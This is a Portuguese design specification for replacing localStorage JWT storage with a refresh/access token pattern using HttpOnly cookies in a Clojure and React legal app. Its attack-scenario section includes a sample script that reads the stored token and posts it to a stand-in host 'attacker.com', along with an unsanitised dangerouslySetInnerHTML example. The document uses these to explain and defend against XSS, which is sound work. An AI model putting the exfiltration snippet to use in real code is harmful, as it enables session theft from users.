# Especificação: Implementação de Refresh/Access Token Pattern

**Status:** 📋 PLANEJADO (Não Implementado)  
**Prioridade:** ALTA  
**Severidade da Vulnerabilidade Atual:** ALTA  
**Complexidade:** MÉDIA-ALTA  
**Tempo Estimado:** 8-12 horas

---

## 🎯 Objetivo

Substituir o armazenamento inseguro de JWT no `localStorage` por um padrão de Refresh/Access Token com cookies HttpOnly, eliminando o risco de roubo de tokens via ataques XSS (Cross-Site Scripting).

---

## 🔴 Problema Atual

### Vulnerabilidade Identificada

**Localização:** `frontend/src/context/AuthContext.jsx`

**Código Atual:**
```javascript
localStorage.setItem('token', data.token);
const [token, setToken] = useState(localStorage.getItem('token'));
```

### Riscos

1. **XSS (Cross-Site Scripting):**
   - `localStorage` é acessível via JavaScript
   - Qualquer script malicioso pode ler o token
   - Dependências vulneráveis podem expor tokens
   - Dados não sanitizados podem executar scripts

2. **Sequestro de Sessão:**
   - Atacante obtém token JWT
   - Acesso total à conta do usuário
   - Pode ser Super Admin com privilégios totais

3. **Persistência do Ataque:**
   - Token permanece válido até expirar
   - Sem mecanismo de revogação efetivo
   - Atacante mantém acesso prolongado

### Cenários de Ataque

**Exemplo 1: Dependência Vulnerável**
```javascript
// Biblioteca comprometida injeta código malicioso
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

**Exemplo 2: Dados Não Sanitizados**
```javascript
// Renderização de dados maliciosos
<div dangerouslySetInnerHTML={{
  __html: userInput // Contém <script>...</script>
}} />
```

---

## ✅ Solução Proposta: Refresh/Access Token Pattern

### Arquitetura

```
┌─────────────────────────────────────────────────────────────┐
│  PADRÃO REFRESH/ACCESS TOKEN                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ACCESS TOKEN (Curta Duração)                               │
│  • Validade: 15 minutos                                     │
│  • Armazenamento: Memória (React State/Context)            │
│  • Uso: Todas as requisições à API                          │
│  • Não persiste em localStorage/sessionStorage              │
│                                                             │
│  REFRESH TOKEN (Longa Duração)                              │
│  • Validade: 7 dias                                         │
│  • Armazenamento: Cookie HttpOnly + Secure                  │
│  • Uso: Renovar access token quando expira                  │
│  • Inacessível via JavaScript                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Fluxo de Autenticação

```
1. LOGIN
   ┌─────────┐                    ┌─────────┐
   │ Cliente │ ─── POST /login ──→│ Backend │
   └─────────┘                    └─────────┘
                                       │
                                       ↓
                              Valida credenciais
                                       │
                                       ↓
                              Gera 2 tokens:
                              • Access Token (15min)
                              • Refresh Token (7d)
                                       │
                                       ↓
   ┌─────────┐                    ┌─────────┐
   │ Cliente │ ←─── Response ─────│ Backend │
   └─────────┘                    └─────────┘
       │
       ├─ Access Token → Memória (State)
       └─ Refresh Token → Cookie HttpOnly

2. REQUISIÇÃO NORMAL
   ┌─────────┐                    ┌─────────┐
   │ Cliente │ ─── GET /api/... ─→│ Backend │
   └─────────┘    + Access Token  └─────────┘
                                       │
                                       ↓
                              Valida Access Token
                                       │
                                       ↓
   ┌─────────┐                    ┌─────────┐
   │ Cliente │ ←─── Dados ────────│ Backend │
   └─────────┘                    └─────────┘

3. ACCESS TOKEN EXPIRADO
   ┌─────────┐                    ┌─────────┐
   │ Cliente │ ─── GET /api/... ─→│ Backend │
   └─────────┘    + Token Expirado└─────────┘
                                       │
                                       ↓
                              Token inválido (401)
                                       │
   ┌─────────┐                    ┌─────────┐
   │ Cliente │ ←─── 401 ───────────│ Backend │
   └─────────┘                    └─────────┘
       │
       ↓
   Interceptor detecta 401
       │
       ↓
   ┌─────────┐                    ┌─────────┐
   │ Cliente │ ─ POST /refresh ──→│ Backend │
   └─────────┘   + Refresh Cookie └─────────┘
                                       │
                                       ↓
                              Valida Refresh Token
                                       │
                                       ↓
                              Gera novo Access Token
                                       │
   ┌─────────┐                    ┌─────────┐
   │ Cliente │ ←─ Novo Access ────│ Backend │
   └─────────┘                    └─────────┘
       │
       ↓
   Atualiza token na memória
       │
       ↓
   Reexecuta requisição original
```

---

## 🛠️ Implementação Detalhada

### BACKEND (Clojure)

#### 1. Modificar Handlers de Login

**Arquivo:** `src/juridico/api/handlers.clj`

**Mudanças:**

```clojure
(ns juridico.api.handlers
  (:require [buddy.sign.jwt :as jwt]
            [ring.util.response :as response]))

;; Configuração
(def access-token-expiry (* 15 60))      ; 15 minutos
(def refresh-token-expiry (* 7 24 60 60)) ; 7 dias

(defn generate-tokens [user-data]
  (let [now (System/currentTimeMillis)
        access-token (jwt/sign
                      (assoc user-data
                             :exp (+ now (* access-token-expiry 1000)))
                      jwt-secret)
        refresh-token (jwt/sign
                       {:user-id (:id user-data)
                        :type :refresh
                        :exp (+ now (* refresh-token-expiry 1000))}
                       jwt-secret)]
    {:access-token access-token
     :refresh-token refresh-token}))

(defn login-handler [request]
  (let [;; ... validação de credenciais ...
        user-data {:id user-id :email email :role role :tenant-id tenant-id}
        tokens (generate-tokens user-data)]
    (-> (response/response {:token (:access-token tokens)})
        (response/set-cookie "refresh_token" (:refresh-token tokens)
                            {:http-only true
                             :secure true
                             :same-site :strict
                             :max-age refresh-token-expiry
                             :path "/"}))))
```

#### 2. Criar Endpoint de Refresh

**Arquivo:** `src/juridico/api/handlers.clj`

```clojure
(defn refresh-token-handler [request]
  (try
    (let [refresh-token (get-in request [:cookies "refresh_token" :value])]
      (if-not refresh-token
        {:status 401 :body {:error "Refresh token não encontrado"}}
        (let [claims (jwt/unsign refresh-token jwt-secret)
              user-id (:user-id claims)]
          (if (not= :refresh (:type claims))
            {:status 401 :body {:error "Token inválido"}}
            (let [;; Buscar dados atualizados do usuário
                  user-data (get-user-by-id user-id)
                  tokens (generate-tokens user-data)]
              (-> (response/response {:token (:access-token tokens)})
                  (response/set-cookie "refresh_token" (:refresh-token tokens)
                                      {:http-only true
                                       :secure true
                                       :same-site :strict
                                       :max-age refresh-token-expiry
                                       :path "/"})))))))
    (catch Exception e
      {:status 401 :body {:error "Token inválido ou expirado"}})))
```

#### 3. Adicionar Rota

**Arquivo:** `src/juridico/api/core.clj`

```clojure
(def api-routes
  [""
   ;; ... rotas existentes ...
   ["/auth"
    ["/login" {:post {:handler h/login-handler}}]
    ["/refresh" {:post {:handler h/refresh-token-handler}}]] ; ← NOVA ROTA
   ;; ...
  ])
```

---

### FRONTEND (React)

#### 1. Modificar AuthContext

**Arquivo:** `frontend/src/context/AuthContext.jsx`

**Mudanças:**

```javascript
import axios from 'axios';
import React, { createContext, useEffect, useState } from 'react';

const AuthContext = createContext();

export const AuthProvider = ({ children }) => {
  // Token agora APENAS na memória (não em localStorage)
  const [token, setToken] = useState(null);
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  // Tentar renovar token ao carregar
  useEffect(() => {
    refreshToken();
  }, []);

  const refreshToken = async () => {
    try {
      const response = await axios.post('/auth/refresh', {}, {
        withCredentials: true // Envia cookies
      });
      
      setToken(response.data.token);
      
      // Decodificar token para obter dados do usuário
      const payload = JSON.parse(atob(response.data.token.split('.')[1]));
      setUser({
        email: payload.email,
        role: payload.role,
        tenantId: payload['tenant-id']
      });
    } catch (error) {
      // Refresh falhou, usuário precisa fazer login
      setToken(null);
      setUser(null);
    } finally {
      setLoading(false);
    }
  };

  const login = async (email, password, subdomain = null) => {
    const response = await axios.post('/login', {
      email,
      password,
      subdomain
    }, {
      withCredentials: true // Recebe cookies
    });

    setToken(response.data.token);
    
    const payload = JSON.parse(atob(response.data.token.split('.')[1]));
    setUser({
      email: payload.email,
      role: payload.role,
      tenantId: payload['tenant-id']
    });

    return response.data;
  };

  const logout = () => {
    setToken(null);
    setUser(null);
    // Limpar cookie no backend (opcional)
    axios.post('/auth/logout', {}, { withCredentials: true });
  };

  return (
    <AuthContext.Provider value={{ 
      token, 
      user, 
      login, 
      logout, 
      refreshToken,
      loading 
    }}>
      {children}
    </AuthContext.Provider>
  );
};

export default AuthContext;
```

#### 2. Criar Interceptor Axios

**Arquivo:** `frontend/src/utils/axiosInterceptor.js` (NOVO)

```javascript
import axios from 'axios';

let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach(prom => {
    if (error) {
      prom.reject(error);
    } else {
      prom.resolve(token);
    }
  });
  
  failedQueue = [];
};

export const setupInterceptors = (refreshTokenFn) => {
  axios.interceptors.response.use(
    (response) => response,
    async (error) => {
      const originalRequest = error.config;

      // Se erro 401 e não é a rota de refresh
      if (error.response?.status === 401 && !originalRequest._retry) {
        if (isRefreshing) {
          // Já está renovando, adiciona à fila
          return new Promise((resolve, reject) => {
            failedQueue.push({ resolve, reject });
          }).then(token => {
            originalRequest.headers['Authorization'] = 'Bearer ' + token;
            return axios(originalRequest);
          }).catch(err => {
            return Promise.reject(err);
          });
        }

        originalRequest._retry = true;
        isRefreshing = true;

        try {
          const newToken = await refreshTokenFn();
          processQueue(null, newToken);
          originalRequest.headers['Authorization'] = 'Bearer ' + newToken;
          return axios(originalRequest);
        } catch (err) {
          processQueue(err, null);
          // Redirecionar para login
          window.location.href = '/login';
          return Promise.reject(err);
        } finally {
          isRefreshing = false;
        }
      }

      return Promise.reject(error);
    }
  );
};
```

#### 3. Integrar Interceptor

**Arquivo:** `frontend/src/main.jsx`

```javascript
import { setupInterceptors } from './utils/axiosInterceptor';
import { AuthProvider } from './context/AuthContext';

// Configurar interceptor
setupInterceptors(async () => {
  const response = await axios.post('/auth/refresh', {}, {
    withCredentials: true
  });
  return response.data.token;
});

// ... resto do código
```

---

## 📊 Impacto e Comportamento Após Implementação

### Segurança

| Aspecto | Antes | Depois | Melhoria |
|---------|-------|--------|----------|
| **Armazenamento de Token** | localStorage (inseguro) | Memória + Cookie HttpOnly | 95% |
| **Vulnerabilidade XSS** | Alta | Baixa | 90% |
| **Tempo de Exposição** | Até expiração (horas/dias) | 15 minutos máximo | 96% |
| **Revogação de Acesso** | Difícil | Fácil (invalidar refresh) | 100% |

### Experiência do Usuário

**Comportamento Atual:**
- ✅ Login persiste entre sessões
- ❌ Token expira sem renovação automática
- ❌ Usuário precisa fazer login novamente

**Comportamento Após Implementação:**
- ✅ Login persiste entre sessões (via refresh token)
- ✅ Token renova automaticamente a cada 15 minutos
- ✅ Usuário permanece logado por 7 dias
- ✅ Logout em uma aba afeta todas as abas
- ✅ Sessão expira após 7 dias de inatividade

### Performance

**Overhead Adicional:**
- Requisição de refresh a cada 15 minutos: ~50ms
- Impacto: Negligível (< 0.1% do tempo total)

**Benefícios:**
- Tokens menores (access token sem dados de refresh)
- Menos dados trafegados
- Cache mais eficiente

---

## 🔧 Configuração Necessária

### Variáveis de Ambiente

**Backend:**
```bash
JWT_SECRET=<chave-secreta-forte>
ACCESS_TOKEN_EXPIRY=900        # 15 minutos
REFRESH_TOKEN_EXPIRY=604800    # 7 dias
COOKIE_SECURE=true             # true em produção
```

**Frontend:**
```bash
VITE_API_URL=https://api.seudominio.com
```

### Render.com

**Configurações Adicionais:**
- Habilitar cookies entre domínios (CORS)
- Configurar `SameSite=None` se frontend e backend em domínios diferentes
- Certificado SSL obrigatório (para cookies Secure)

---

## ✅ Checklist de Implementação

### Backend
- [ ] Adicionar função `generate-tokens`
- [ ] Modificar `login-handler` para retornar refresh token em cookie
- [ ] Criar `refresh-token-handler`
- [ ] Adicionar rota `/auth/refresh`
- [ ] Configurar cookies com flags HttpOnly e Secure
- [ ] Testar renovação de token
- [ ] Implementar logout (invalidar refresh token)

### Frontend
- [ ] Remover `localStorage.setItem/getItem('token')`
- [ ] Modificar `AuthContext` para usar apenas memória
- [ ] Criar interceptor Axios
- [ ] Integrar interceptor no app
- [ ] Implementar renovação automática
- [ ] Testar fluxo completo de login/refresh/logout
- [ ] Testar expiração de tokens

### Testes
- [ ] Teste: Login retorna access + refresh token
- [ ] Teste: Refresh token renova access token
- [ ] Teste: Access token expirado aciona refresh
- [ ] Teste: Refresh token expirado redireciona para login
- [ ] Teste: Logout invalida refresh token
- [ ] Teste: XSS não consegue acessar tokens

---

## 📚 Referências

- [OWASP: Token Storage](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [RFC 6749: OAuth 2.0 Refresh Tokens](https://tools.ietf.org/html/rfc6749#section-1.5)
- [MDN: HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)

---

## 🎯 Próximos Passos

1. **Revisar esta especificação** com a equipe
2. **Estimar tempo** de implementação preciso
3. **Priorizar** na sprint/backlog
4. **Implementar backend** primeiro (endpoints de refresh)
5. **Implementar frontend** (interceptor e context)
6. **Testar** em ambiente de staging
7. **Deploy** em produção
8. **Monitorar** logs de renovação de tokens

---

**Documento criado em:** 10 de Outubro de 2025  
**Última atualização:** 10 de Outubro de 2025  
**Status:** Aguardando Implementação
